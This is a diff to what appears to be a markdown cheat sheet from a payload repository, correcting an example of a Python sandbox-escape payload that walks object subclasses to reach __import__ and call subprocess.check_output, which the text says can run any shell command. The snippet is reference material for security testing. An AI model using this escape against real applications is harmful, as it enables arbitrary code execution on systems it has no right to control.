@@ -24,7 +24,7 @@ A useful repository that has all kinds of payload for a lot of diffrent attacks.
 [t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__'](<the library name>).<the function>
 
 example:
-[t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']().check_output(['ls', '-l'])
+[t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']['__import__']("subprocess").check_output(['ls', '-l'])
 
 In this example we call the check_output function from the subprocess library.
 This example can essentioly run any shell code on the machine using python.
